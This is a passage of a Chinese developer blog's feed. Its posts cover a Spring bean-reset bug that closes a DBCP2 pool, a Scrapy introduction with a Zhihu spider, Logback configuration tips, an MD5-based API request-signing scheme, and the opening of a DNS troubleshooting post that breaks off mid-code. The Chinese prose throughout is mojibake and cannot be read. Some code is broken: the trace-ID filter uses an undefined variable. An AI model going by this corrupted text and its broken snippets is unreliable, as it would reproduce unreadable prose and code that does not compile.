		this.beanDefinitionMap.put(beanName, beanDefinition);

		if (oldBeanDefinition != null || containsSingleton(beanName)) {
			resetBeanDefinition(beanName);
		}
		
		
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code&gt;protected void resetBeanDefinition(String beanName) {
		// Remove the merged bean definition for the given bean, if already created.
		clearMergedBeanDefinition(beanName);

		// Remove corresponding bean from singleton cache, if any. Shouldn&#39;t usually
		// be necessary, rather just meant for overriding a context&#39;s default beans
		// (e.g. the default StaticMessageSource in a StaticApplicationContext).
		destroySingleton(beanName);

		// Reset all bean definitions that have the given bean as parent (recursively).
		for (String bdName : this.beanDefinitionNames) {
			if (!beanName.equals(bdName)) {
				BeanDefinition bd = this.beanDefinitionMap.get(bdName);
				if (beanName.equals(bd.getParentName())) {
					resetBeanDefinition(bdName);
				}
			}
		}
	}

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;åŸæ¥Springåˆ›å»ºBeançš„æ—¶å€™ä¼šæ£€æŸ¥æ˜¯å¦æœ‰oldBeanDefinition,å¦‚æœæœ‰åˆ™é”€æ¯ä¹‹.è€ŒDBCP2å®ç°äº†AutoCloseableæ¥å£,åœ¨è¿™é‡Œç›´æ¥è¢«Closeäº†.&lt;/p&gt;

&lt;h4 id=&#34;ä¸ºä»€ä¹ˆæœ‰oldbeandefinition&#34;&gt;ä¸ºä»€ä¹ˆæœ‰oldBeanDefinitionï¼Ÿ&lt;/h4&gt;

&lt;p&gt;ä¸ºäº†æ”¯æŒå¦ä¸€ç§ç±»å‹çš„æ•°æ®æº,å¼•å…¥äº†ä¸€ä¸ªBug,ä¼šåœ¨Spring BeanFactoryé‡Œé¢å¼•å…¥é‡å¤çš„å®šä¹‰,å› ä¸ºåœ¨AbstractRoutingDataSourceä¸­æ˜¯æ­£ç¡®çš„,æ‰€ä»¥ä¸€ç›´æ²¡æœ‰å‘ç°è¿™ä¸ªé—®é¢˜.ç¬¬äºŒæ¬¡ä¼šé”€æ¯ä¸Šæ¬¡çš„Bean.
å…¶å®åœ¨DBCP1æ—¶å€™,ä¹Ÿä¼šé”€æ¯,ä½†æ˜¯å› ä¸ºåœ¨åŠ¨æ€å®šä¹‰çš„æ—¶å€™æ²¡æœ‰å®šä¹‰destroy-method=&amp;ldquo;close&amp;rdquo;,å…¶å®ä¼šå¼•èµ·å†…å­˜çš„æ³„éœ²ï¼Ÿ&lt;/p&gt;

&lt;p&gt;ç»“è®ºï¼šå¾ˆå¤šçœ‹ä¼¼è¿è¡Œå®Œå¥½çš„è½¯ä»¶å…¶å®éƒ½å±æœºå››ä¼..&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Scrapy</title>
      <link>https://lawulu.github.io/post/Scrapy%E5%88%9D%E7%AA%A5/</link>
      <pubDate>Thu, 15 Oct 2015 00:00:00 +0000</pubDate>
      
      <guid>https://lawulu.github.io/post/Scrapy%E5%88%9D%E7%AA%A5/</guid>
      <description>

&lt;p&gt;æœ€è¿‘å‡ºäºå…´è¶£çœ‹äº†ä¸€ä¸‹Scrapy.ç¬¬ä¸€æ¬¡ä»”ç»†ç ”ç©¶ä¸€ä¸ªPythonæ¡†æ¶,å…ˆè¯´ç»“è®º,çˆ¬è™«åˆ†ä¸ºä¸¤ç§,ä¸€ç§æ˜¯è´ªå©ªçˆ¬è™«,æœ€å¸¸ç”¨çš„å°±æ˜¯æœç´¢å¼•æ“,çœ‹è§Urlå°±çˆ¬.å¦å¤–ä¸€ç§æ˜¯ä¸“ä¸šçˆ¬è™«,ç±»ä¼¼äºç½‘ç»œå°æ•°å®šæœŸæ›´æ–°,ä»·æ ¼æ¯”å¯¹.Scrapyé€‚åˆåšç¬¬äºŒç§.Scrapyä¸“å¿ƒåšçˆ¬å–é€»è¾‘,å…¶ä¼˜åŠ¿æ˜¯æ¡†æ¶æ¯”è¾ƒæˆç†Ÿ,å„ç§æ’ä»¶æ¯”è¾ƒå…¨.å¦‚æœçœŸæ­£åšä¸€ä¸ªå·¥ä¸šåŒ–çš„äº§å“,Scrapyè¿œè¿œä¸å¤Ÿ,è¿˜è¦æ”’å¾ˆå¤šä¸œè¥¿è¿›æ¥.å…¶å®å¦‚æœå¯¹&lt;code&gt;requests&lt;/code&gt;å’Œ&lt;code&gt;beautifulsoup&lt;/code&gt;ç†Ÿæ‚‰,ç›´æ¥ä¸Šè¿™ä¿©å°±æŒºå¥½çš„.&lt;/p&gt;

&lt;h2 id=&#34;ç®€ä»‹&#34;&gt;ç®€ä»‹&lt;/h2&gt;

&lt;p&gt;Scrapyå…¶å®æ˜¯ä¸€ä¸ªå¾ˆè½»é‡çº§æˆ–è€…ç®€å•çš„æ¡†æ¶.å‡ ä¸ªæ¦‚å¿µï¼š
1. &lt;code&gt;Request&lt;/code&gt;,&lt;code&gt;Response&lt;/code&gt;,é¡¾åæ€ä¹‰,å¯¹åº”çš„å°±æ˜¯ç½‘ç»œçš„è¯·æ±‚å’Œå“åº”.
2. &lt;code&gt;Item&lt;/code&gt;æˆ–è€…python dict,å¯¹åº”çš„æ˜¯çˆ¬å–åˆ°çš„ç»“æœ.
3. &lt;code&gt;Pipeline&lt;/code&gt;å¯¹Itemçš„å¤„ç†.
4. &lt;code&gt;Selector&lt;/code&gt;å¯¹åº”çš„æ˜¯å¯¹HTMLçš„å¤„ç†
5. &lt;code&gt;Middleware&lt;/code&gt;ç›¸å½“äºFilter,åˆ†ä¸¤ç§,ä¸€ç§æ˜¯é’ˆå¯¹Spider,ä¸€ç§é’ˆå¯¹ç½‘ç»œè¿æ¥
6. &lt;code&gt;Scheduler&lt;/code&gt;ä¸€ä¸ªæ·±åº¦ä¼˜å…ˆçš„é˜Ÿåˆ—
7. &lt;code&gt;Feed&lt;/code&gt; å®˜æ–¹æä¾›çš„jsonæˆ–è€…json lineçš„è¾“å‡º
8. &lt;code&gt;meta&lt;/code&gt; å¯ä»¥åœ¨å¤šä¸ªSpiderä¹‹é—´ä¼ è¾“æ•°æ®&lt;/p&gt;

&lt;p&gt;å…¶å®æŠŠæ–‡æ¡£çœ‹ä¸€é,ä¸‹ä¸€ä¸ªdemo,å¾ˆå¿«å°±å¯ä»¥è·‘èµ·æ¥.&lt;/p&gt;

&lt;p&gt;çœ‹å›¾å…¶å®å¾ˆæ¸…æ¥šï¼š
&lt;img src=&#34;https://lawulu.github.io/iimg/scrapy.png&#34; alt=&#34;Scrapy Arch&#34; /&gt;&lt;/p&gt;

&lt;p&gt;ä»StartRequestå¼€å§‹,ä¸åœçš„è¿”å›Itemæˆ–è€…è¿”å›Request,å¦‚æœè¿”å›Item,å°±å‘åˆ°Pipelineå»å¤„ç†,è¿”å›Request,ç»è¿‡Callbackå¤„ç†ä¹‹å,ç›´åˆ°æ‰€æœ‰çš„Requestéƒ½å˜æˆItem.æ­£æ‰€è°“,ä¸–ç•Œæ˜¯å±äºRequest,å½’æ ¹ç»“åº•è¿˜æ˜¯å±äºItemçš„.&lt;/p&gt;

&lt;h2 id=&#34;ç®€å•ç¤ºä¾‹&#34;&gt;ç®€å•ç¤ºä¾‹&lt;/h2&gt;

&lt;pre&gt;&lt;code&gt;import scrapy
class ZhihuSpider(scrapy.Spider):
    name = &amp;quot;zhihu&amp;quot;
    start_urls = [
        &#39;https://www.zhihu.com/explore&#39;,
    ]

    def parse(self, response):
        # self.logger.info(&amp;quot;------zzhonä¸­å›½&amp;quot;)

        for feed in response.css(&#39;.recommend-feed&#39;):
            link = response.urljoin(feed.css(&#39;a::attr(href)&#39;).extract_first());
            yield scrapy.Request(link,callback=self.parse_content)
           

##!!!  print response.css(&#39;#zh-question-detail &amp;gt; div&#39;).extract()[0].encode(&#39;utf-8&#39;)

    def parse_content(self,response):
        yield {
            &#39;title&#39;:response.css(&#39;#zh-question-title &amp;gt; h2 &amp;gt; a::text&#39;).extract_first(),
            &#39;content&#39;:response.css(&#39;#zh-question-detail &amp;gt; div::text&#39;).extract(),
            &#39;link&#39;:response.url
        }

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;å½“ç„¶è¿™ä¸ªç¤ºä¾‹è·‘èµ·æ¥ä¹‹å‰,éœ€è¦æ”¹ä¸€äº›é…ç½®æ–‡ä»¶å’Œè®¾ç½®User-agentâ€¦&lt;/p&gt;

&lt;h2 id=&#34;åæ§½&#34;&gt;åæ§½&lt;/h2&gt;

&lt;p&gt;Javaå‡ºèº«çš„ç¨‹åºå‘˜çš„åæ§½â€¦ ä¸ç”¨åœ¨æ„ğŸ˜œ&lt;/p&gt;

&lt;h3 id=&#34;æ—¥å¿—åªæ‰“å°unicodeé—®é¢˜&#34;&gt;æ—¥å¿—åªæ‰“å°Unicodeé—®é¢˜&lt;/h3&gt;

&lt;p&gt;Debugå’Œç›‘æ§èµ·æ¥éå¸¸ä¸æ–¹ä¾¿,æˆ‘çœ‹å®˜æ–¹æŠŠè¿™ä¸ªissueå½“åšwont fixäº†,å¼ºçƒˆæ¨èç›´æ¥ä¸ŠPython3.å¯¹éè‹±æ–‡ä¸–ç•Œæ¥è¯´,Python2ä¸‹scrapy shellç®€ç›´æ²¡äº†å­˜åœ¨çš„å¿…è¦â€¦&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;2015-10-14 23:25:54 [scrapy] DEBUG: Scraped from &amp;lt;200 https://www.zhihu.com/question/29218955/answer/41797438&amp;gt; 
{&#39;content&#39;: [u&#39;\u666e\u6d31\u5728\u8fc7\u53bb\u5e94\u8be5\u662f\u4e0d\u4e0a\u53f0\u9762\u7684\u5427\uff1f\u4e5f\u6ca1\u95ee\u662f\u4e0d\u662f\u5c31\u95ee\u4e3a\u4ec0\u4e48\u4e86\uff0c\u5982\u679c\u95ee\u9898\u6709\u9519\u8bef\uff0c\u8bf7\u6307\u6b63&#39;], &#39;link&#39;: &#39;https://www.zhihu.com/question/19258955/answer/42797438&#39;, &#39;title&#39;: u&#39;\u666e\u6d31\u7531\u539f\u6765\u4e0d\u4e0a\u53f0\u9762\u7684\u8fb9\u9500\u8336\u5230\u5982\u4eca\u53d7\u5230\u5e7f\u5927\u8336\u53cb\u559c\u7231\u7684\u8336\u7c7b\uff0c\u9664\u4e86\u7092\u4f5c\u5916\uff0c\u666e\u6d31\u7684\u5de5\u827a\u6216\u8005\u8d28\u91cf\u6709\u4e86\u5f88\u5927\u8fdb\u6b65\u5417\uff1f&#39;} 

&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;schedulerå¤ªå¼±&#34;&gt;Schedulerå¤ªå¼±&lt;/h3&gt;

&lt;p&gt;è‡ªå¸¦çš„scheduleråªèƒ½æ·±åº¦ä¼˜å…ˆå’Œå¹¿åº¦ä¼˜å…ˆ,å®˜æ–¹æ¨èæ˜¯è‡ªå®¶çš„scrapyd,ç¨å¾®äº†è§£äº†ä¸‹,åº”è¯¥æ˜¯å¯åŠ¨æ—¶å€™æŠŠä»»åŠ¡åˆ†ç»™å¤šä¸ªè¿›ç¨‹,è¿›ç¨‹ä¹‹é—´å¥½åƒæ²¡æ³•äº¤äº’.&lt;/p&gt;

&lt;h3 id=&#34;spider-requestä¹‹é—´å¾ˆéš¾ååŒ&#34;&gt;Spider/Requestä¹‹é—´å¾ˆéš¾ååŒ&lt;/h3&gt;

&lt;p&gt;å¾ˆå¤šæ—¶å€™æˆ‘ä»¬éœ€è¦æŸå‡ ä¸ªRequeståº”è¯¥åœ¨ä¸€ä¸ªç»„é‡Œé¢,åŒä¸€ä¸ªç»„çš„Requestå¯ä»¥å…±ç”¨Cookie,å…±ç”¨ä»£ç†.è¿™ç±»çš„éœ€æ±‚å¯ä»¥é€šè¿‡metaæœºåˆ¶æ¥å®ç°â€¦ç”±äºScrapyçš„Requestæ˜¯æ— è„‘yieldå‡ºæ¥çš„,å®ç°å‡ºæ¥è‚¯å®šå¾ˆä¸‘é™‹.&lt;/p&gt;

&lt;h3 id=&#34;callback-hell&#34;&gt;Callback hell&lt;/h3&gt;

&lt;p&gt;é€šè¿‡Callbackæ¥ç»‘å®šå¤„ç†æ–¹æ³•,å…¥å£å’Œå¯æµ‹è¯•æ€§å¾ˆå·®,æ€ªä¸å¾—è¦åŠ å…¥Contractæœºåˆ¶&lt;/p&gt;

&lt;h3 id=&#34;å®¹é”™&#34;&gt;å®¹é”™&lt;/h3&gt;

&lt;p&gt;å®¹é”™æœºåˆ¶å¾ˆå°‘,éœ€è¦æŠŠTaskæŒä¹…åŒ–,å®˜æ–¹æä¾›çš„æŒä¹…åŒ–åˆ°diskçš„æ–¹æ¡ˆæ„Ÿè§‰å¾ˆåˆçº§å¾ˆç²—ç³™.&lt;/p&gt;

&lt;h2 id=&#34;splash&#34;&gt;Splash&lt;/h2&gt;

&lt;p&gt;Pyspideræ˜¯ç”¨çš„&lt;code&gt;PhantomJS&lt;/code&gt;,Scrapyæä¾›äº†ä¸€ä¸ªåŸºäºDockerå’ŒLuaçš„Splash.
è¿™è´§çš„é—®é¢˜æ˜¯Splashæ²¡æœ‰ä¿æŒæ¸²æŸ“çŠ¶æ€çš„æ–¹æ³•,å¯¹äºå¤æ‚çš„JSäº¤äº’,ä¸€èˆ¬çš„åšæ³•æ˜¯ä¸€ä¸ªluaè„šæœ¬æ‰§è¡Œå¾ˆå¤šæ¬¡,æœ€åè¿”å›æ‰€æœ‰çš„ç»“æœ.è¿™æ ·çˆ¬å–çš„é¢—ç²’æ¯”è¾ƒå¤§,å¦‚æœä¸­é—´å‡ºç°å¼‚å¸¸,ä¸å¥½å¤„ç†,è€Œä¸”è°ƒç”¨&lt;code&gt;splash::wait()&lt;/code&gt;æ€»æ„Ÿè§‰ä¸é è°±,æ²¡æœ‰æä¾›DomåŠ è½½ä¹‹åçš„å›è°ƒå—ï¼Ÿ&lt;/p&gt;

&lt;h3 id=&#34;åŸç†&#34;&gt;åŸç†&lt;/h3&gt;

&lt;p&gt;Splashå¯ä»¥æ‰§è¡ŒLuaè„šæœ¬,å®˜æ–¹å°è£…äº†Splashç±»,å¯ä»¥å’ŒJSäº¤äº’.è¿™æ ·,å°±å¯å¯ä»¥æ‰¾åˆ°Domä¸­çš„Button,ç›´æ¥è°ƒç”¨clickäº‹ä»¶,ç„¶åè¿”å›æŸäº›DOMä¸­çš„Htmlæˆ–è€…Json.&lt;/p&gt;

&lt;h3 id=&#34;lua&#34;&gt;Lua&lt;/h3&gt;

&lt;p&gt;Lua å¾ˆå€¼å¾—ä¸€å­¦,Nginx,æ¸¸æˆå¼•æ“,Rediséƒ½åœ¨ç”¨â€¦â€¦
å¿«é€Ÿå…¥é—¨ï¼š&lt;a href=&#34;http://tylerneylon.com/a/learn-lua/&#34;&gt;http://tylerneylon.com/a/learn-lua/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Luaç¨å¾®å¤æ‚å¹¶ä¸”å¯ä»¥ç©å‡ºèŠ±çš„å†…ç½®æœºåˆ¶å°±æ˜¯Metatableäº†,å¯ä»¥é‡è½½å¯¹å­—å…¸(å¯¹è±¡)å„ç§æ“ä½œç¬¦.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Logbackçš„ä¸€äº›å¥‡æŠ€æ·«å·§</title>
      <link>https://lawulu.github.io/post/Logback%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/</link>
      <pubDate>Sun, 23 Aug 2015 00:00:00 +0000</pubDate>
      
      <guid>https://lawulu.github.io/post/Logback%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/</guid>
      <description>

&lt;p&gt;Logbackæ˜¯ä¸€æ¬¾éå¸¸ä¼˜ç§€çš„æ—¥å¿—æ¡†æ¶.ä½†æ˜¯æ¯ä¸ªå¼€å‘é¢å¯¹çš„éœ€æ±‚ä¹Ÿæ˜¯å¤šç§å¤šæ ·çš„.
å¦‚æœä½ æœ‰ä¸‹é¢çš„éœ€æ±‚,é‚£ä½ çœ‹äº†è¿™ç¯‡æ–‡ç« å°±å¯ä»¥äº†ï¼š&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;æ¯æ¬¡è°ƒç”¨é“¾éƒ½ç”Ÿæˆä¸€ä¸ªå”¯ä¸€çš„traceId&lt;/li&gt;
&lt;li&gt;ä¿®æ”¹é…ç½®æ–‡ä»¶å³æ—¶ç”Ÿæ•ˆ,ä¾‹å¦‚,ä¸ºäº†å®šä½ä¸€ä¸ªé—®é¢˜,ä¸´æ—¶å°†logçº§åˆ«ä¿®æ”¹ä¸ºdebug&lt;/li&gt;
&lt;li&gt;ä¸åŒç¯å¢ƒä½¿ç”¨ä¸åŒçš„é…ç½®&lt;/li&gt;
&lt;li&gt;Logbackçš„é»˜è®¤Rollingç­–ç•¥æ˜¯ï¼šæœ‰æ–°çš„Logäº§ç”Ÿ,å¦‚æœéœ€è¦rolling,åˆ™renameåŸæ¥çš„æ–‡ä»¶.è¿™æ ·ä¼šå­˜åœ¨çš„ä¸€ä¸ªé—®é¢˜å°±æ˜¯,å¦‚æœæ²¡æœ‰æ–°çš„logäº§ç”Ÿ,å°±ä¸ä¼šé‡å‘½ååŸæ¥çš„æ–‡ä»¶.å¦‚æœé‡ä¸Šéœ€è¦åŒæ­¥æ—¥å¿—(ä¾‹å¦‚Rsync),å°±ä¼šå‡ºç°é—®é¢˜.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;æ—¥å¿—çš„traceid&#34;&gt;æ—¥å¿—çš„TraceId&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;åœ¨Filteré‡Œé¢å¢åŠ ä¸€ä¸ª,ThreadLocal based å˜é‡ï¼š&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code&gt;
public class CustomFilter extends OncePerRequestFilter {
	
	private static final Random random = new Random(System.currentTimeMillis()); //TODO

	@Override
	protected void doFilterInternal(HttpServletRequest request,
			HttpServletResponse response, FilterChain filterChain)
			throws ServletException, IOException {
		
	
		request.setAttribute(ApiConstants.RQID, rnd);
		
		response.setHeader(ApiConstants.HEADER_RQID, rnd);
		MDC.put(ApiConstants.RQID, rnd);
		try{
			filterChain.doFilter(request, response);
		}finally{
			MDC.remove(ApiConstants.RQID);
		}

	}

}
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
&lt;li&gt;é…ç½®æ–‡ä»¶&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code&gt; &amp;lt;encoder&amp;gt;
	        &amp;lt;pattern&amp;gt;%d{yyyy-MM-dd HH:mm:ss} %-4relative [%thread] %-5level %logger{35} [%X{x-jjk-rqid:-notFound}]- %msg%n&amp;lt;/pattern&amp;gt;
	    &amp;lt;/encoder&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;è‡ªåŠ¨æ›´æ–°é…ç½®&#34;&gt;è‡ªåŠ¨æ›´æ–°é…ç½®&lt;/h3&gt;

&lt;p&gt;æ˜¾ç„¶ä¼šå½±å“æ•ˆç‡&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;configuration debug=&amp;quot;true&amp;quot; scan=&amp;quot;true&amp;quot; scanPeriod=&amp;quot;1 minutes&amp;quot;&amp;gt;

&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;å„ä¸ªç¯å¢ƒå¼•å…¥ä¸åŒçš„profile&#34;&gt;å„ä¸ªç¯å¢ƒå¼•å…¥ä¸åŒçš„Profile&lt;/h3&gt;

&lt;pre&gt;&lt;code&gt;	&amp;lt;property resource=&amp;quot;config/config-${envTarget}.properties&amp;quot;/&amp;gt;

&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;åŸºäºæ¡ä»¶å†™ä¸åŒçš„æ–‡ä»¶-siftingappender&#34;&gt;åŸºäºæ¡ä»¶å†™ä¸åŒçš„æ–‡ä»¶ï¼šSiftingAppender&lt;/h3&gt;

&lt;pre&gt;&lt;code&gt; &amp;lt;appender name=&amp;quot;stats&amp;quot; class=&amp;quot;ch.qos.logback.classic.sift.SiftingAppender&amp;quot;&amp;gt;
        &amp;lt;!-- in the absence of the class attribute, it is assumed that the
             desired discriminator type is
             ch.qos.logback.classic.sift.MDCBasedDiscriminator --&amp;gt;
        &amp;lt;discriminator&amp;gt;
            &amp;lt;key&amp;gt;date&amp;lt;/key&amp;gt;
            &amp;lt;defaultValue&amp;gt;unknown&amp;lt;/defaultValue&amp;gt;
        &amp;lt;/discriminator&amp;gt;
        &amp;lt;sift&amp;gt;
            &amp;lt;appender name=&amp;quot;FILE-${date}&amp;quot; class=&amp;quot;ch.qos.logback.core.FileAppender&amp;quot;&amp;gt;
                &amp;lt;file&amp;gt;/mnt/media-${date}.log&amp;lt;/file&amp;gt;
                &amp;lt;!--&amp;lt;append&amp;gt;false&amp;lt;/append&amp;gt;--&amp;gt;
                &amp;lt;encoder&amp;gt;
                    &amp;lt;pattern&amp;gt;%msg%n&amp;lt;/pattern&amp;gt;
                    &amp;lt;charset&amp;gt;UTF-8&amp;lt;/charset&amp;gt;
                &amp;lt;/encoder&amp;gt;
            &amp;lt;/appender&amp;gt;
        &amp;lt;/sift&amp;gt;
    &amp;lt;/appender&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ä»£ç ä¸­éœ€è¦å†™MDCå˜é‡ï¼š&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;        MDC.put(&amp;quot;date&amp;quot;, dateString);

&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>ä¸€ç§ç»Ÿä¸€çš„APIç­¾åæ ¡éªŒå®ç°</title>
      <link>https://lawulu.github.io/post/%E4%B8%80%E7%A7%8D%E7%BB%9F%E4%B8%80%E7%9A%84API%E7%AD%BE%E5%90%8D%E6%A0%A1%E9%AA%8C%E6%96%B9%E6%B3%95/</link>
      <pubDate>Mon, 10 Aug 2015 00:00:00 +0000</pubDate>
      
      <guid>https://lawulu.github.io/post/%E4%B8%80%E7%A7%8D%E7%BB%9F%E4%B8%80%E7%9A%84API%E7%AD%BE%E5%90%8D%E6%A0%A1%E9%AA%8C%E6%96%B9%E6%B3%95/</guid>
      <description>

&lt;h2 id=&#34;ç­¾åæ–¹æ³•&#34;&gt;ç­¾åæ–¹æ³•:&lt;/h2&gt;

&lt;h2 id=&#34;header&#34;&gt;Header:&lt;/h2&gt;

&lt;pre&gt;&lt;code&gt;
@RequestHeader(value = &amp;quot;x-header-timestamp&amp;quot;) Long timestamp,
@RequestHeader(value = &amp;quot;x-header-appid&amp;quot;) String appid,
@RequestHeader(value = &amp;quot;x-header-sign&amp;quot;) String sign
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;æºä¸²-orignalstring&#34;&gt;æºä¸² orignalString:&lt;/h2&gt;

&lt;pre&gt;&lt;code&gt;
HttpMethod=URI&amp;amp;Param1=Value1&amp;amp;Param2=Value2RequestBodySeckeyTimestamp
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;æ³¨1:Methodå¤§å†™
æ³¨2:ä¸ºæ–¹ä¾¿æœŸé—´Paramä¸æ’åº,å¦‚æœå‡ºé—®é¢˜å†è¯´
æ³¨3:ResustBodyå¯èƒ½ä¸ºç©º
æ³¨4:SecKeyè·ŸAppIdæ˜¯ä¸€ä¸€å¯¹åº”.&lt;/p&gt;

&lt;h2 id=&#34;ç­¾å-sign&#34;&gt;ç­¾å sign:&lt;/h2&gt;

&lt;pre&gt;&lt;code&gt;sign=Md5(orignalString).toUpperCase
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;æš‚æ—¶åªæ”¯æŒMD5&lt;/p&gt;

&lt;h2 id=&#34;å®ç°&#34;&gt;å®ç°:&lt;/h2&gt;

&lt;p&gt;åŸåˆ™ä¸Š,åº”è¯¥å’Œä¸šåŠ¡é€»è¾‘ä»£ç åˆ†ç¦»,ä¸å½±å“ä¸šåŠ¡é€»è¾‘ä»£ç çš„å¼€å‘&lt;/p&gt;

&lt;h3 id=&#34;1-æ ¹æ®æ³¨è§£mappingéœ€è¦æ£€æŸ¥ç­¾åçš„æ–¹æ³•&#34;&gt;1 æ ¹æ®æ³¨è§£Mappingéœ€è¦æ£€æŸ¥ç­¾åçš„æ–¹æ³•&lt;/h3&gt;

&lt;p&gt;ä¾‹å¦‚:Spring @ControllerAdvice(annotations = RestController.class)
å¦‚éœ€è¦,å¯è‡ªå®šä¹‰è‡ªå·±çš„æ³¨è§£&lt;/p&gt;

&lt;h3 id=&#34;2-è·å–å‚æ•°&#34;&gt;2 è·å–å‚æ•°&lt;/h3&gt;

&lt;pre&gt;&lt;code&gt;
@ModelAttribute
	public void checkSign(HttpServletRequest request, HttpServletResponse response, @RequestBody(required=false) String requestbody,
			@RequestHeader(value = &amp;quot;x-header-timestamp&amp;quot;) Long timestamp,
			@RequestHeader(value = &amp;quot;x-header-appid&amp;quot;) String appid,
			@RequestHeader(value = &amp;quot;x-header-sign&amp;quot;) String sign) 
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;3-è®¡ç®—ç­¾å&#34;&gt;3 è®¡ç®—ç­¾å&lt;/h3&gt;

&lt;p&gt;å¯èƒ½éœ€è¦åœ¨GLobalExceptionHandlerä¸­å¢åŠ &lt;/p&gt;

&lt;pre&gt;&lt;code&gt;
    @ExceptionHandler(ServletRequestBindingException.class) 
    	@ResponseStatus(HttpStatus.BAD_REQUEST)	
    	@ResponseBody 
    	ErrorMessage handleServletRequestBindingException(ServletRequestBindingException ex) {	
    		
    		LOGGER.debug(&amp;quot;handleServletRequestBindingException&amp;quot;, ex);
    		return new ErrorMessage(ErrorCode.INVALID_HEADER.getCode(), ex.getMessage());//TODO
    	}
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;å¢åŠ filter&#34;&gt;å¢åŠ Filter&lt;/h2&gt;

&lt;p&gt;æ³¨æ„ï¼šå› ä¸ºåœ¨ControllerAdviceæ¶ˆè´¹äº†Requestçš„InputStream,æ‰€ä»¥éœ€è¦åœ¨å‰é¢çš„Filterä¸­Copyä¸€ä»½Requestå‡ºæ¥
ä»£ç å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;/**
 * Wrapper used to be able to consume multiple times the InputStream provided by
 * HttpServletRequest
 *
 * @author lawulu
 * @see https://github.com/ClouDesire/spring-utils/
 * 
 */

public class CustomHttpServletRequestWrapper extends HttpServletRequestWrapper {
    private final byte[] body;

    public CustomHttpServletRequestWrapper(HttpServletRequest request) throws IOException {
        super(request);
        if (request.getContentType() != null
                &amp;amp;&amp;amp; request.getContentType().contains(MediaType.APPLICATION_JSON.toString())) {
            InputStream inputStream = request.getInputStream();
            if (inputStream != null) {
                body = IOUtils.toByteArray(inputStream);
                return;
            }
        }
        body = null;
    }

    @Override
    public ServletInputStream getInputStream() throws IOException {
        if (body == null)
            return super.getInputStream();

        final ByteArrayInputStream stream = new ByteArrayInputStream(body);
        ServletInputStream inputStream = new ServletInputStream() {
            @Override
            public int read() throws IOException {
                return stream.read();
            }
        };
        return inputStream;
    }

    @Override
    public BufferedReader getReader() throws IOException {
        if (body == null)
            return super.getReader();

        return new BufferedReader(new InputStreamReader(new ByteArrayInputStream(body), StandardCharsets.UTF_8));
    }

}
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>éƒ½æ˜¯DNSæƒ¹çš„ç¥¸</title>
      <link>https://lawulu.github.io/post/%E9%83%BD%E6%98%AFDNS%E6%83%B9%E7%9A%84%E8%B4%A7/</link>
      <pubDate>Sat, 01 Aug 2015 00:00:00 +0000</pubDate>
      
      <guid>https://lawulu.github.io/post/%E9%83%BD%E6%98%AFDNS%E6%83%B9%E7%9A%84%E8%B4%A7/</guid>
      <description>

&lt;p&gt;æœ€è¿‘å› ä¸ºå·¥ä½è°ƒæ•´,å†…éƒ¨ç”¨çš„æµ‹è¯•æœºæ¢äº†ä¸ªåœ°æ–¹,ç»“æœå‘ç°ä¸Šé¢éƒ¨ç½²çš„åº”ç”¨å˜å¾—éƒ½ååº”å¥‡æ…¢,æ¯æ¬¡SSHä¸Šå»ä¹Ÿè¦å¡é¡¿å¾ˆä¹….&lt;/p&gt;

&lt;h2 id=&#34;æ˜¯ä¸æ˜¯ç½‘ç»œé—®é¢˜&#34;&gt;æ˜¯ä¸æ˜¯ç½‘ç»œé—®é¢˜?&lt;/h2&gt;

&lt;h3 id=&#34;pingæ¯”è¾ƒæ­£å¸¸&#34;&gt;Pingæ¯”è¾ƒæ­£å¸¸&lt;/h3&gt;

&lt;pre&gt;&lt;code&gt;PING 192.168.214.227 (192.168.214.227): 56 data bytes
64 bytes from 192.168.214.227: icmp_seq=0 ttl=64 time=0.073 ms
64 bytes from 192.168.214.227: icmp_seq=1 ttl=64 time=0.100 ms
64 bytes from 192.168.214.227: icmp_seq=2 ttl=64 time=0.092 ms
64 bytes from 192.168.214.227: icmp_seq=3 ttl=64 time=0.074 ms
64 bytes from 192.168.214.227: icmp_seq=4 ttl=64 time=0.057 ms
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;æ²¡æœ‰ä¸¢åŒ…,tracerouteè²Œä¼¼ä¹Ÿæ²¡æœ‰é—®é¢˜&lt;/p&gt;

&lt;h3 id=&#34;æµ‹é€Ÿ&#34;&gt;æµ‹é€Ÿ&lt;/h3&gt;

&lt;p&gt;ç”Ÿæˆä¸€ä¸ªå¤§æ–‡ä»¶:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#*-*coding:utf-8 *-*
&#39;&#39;&#39;&#39;&#39;
Created on 2012-6-14

&#39;&#39;&#39;
def gen_file(path,size):
